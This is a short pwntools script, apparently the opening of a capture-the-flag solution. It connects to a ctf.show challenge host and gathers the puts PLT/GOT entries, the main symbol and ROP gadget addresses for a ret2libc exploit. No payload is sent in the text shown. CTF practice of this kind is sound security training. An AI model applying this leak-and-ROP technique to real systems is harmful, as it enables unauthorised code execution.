from pwn import * 
from LibcSearcher import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28137)
elf = ELF('./pwn')
libc = ELF('/home/bit/libc/64bit/libc-2.27.so')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.sym['main']
pop_rdi = 0x4007f3    # 0x00000000004007f3 : pop rdi ; ret
ret = 0x4004fe        #  0x00000000004004fe : ret
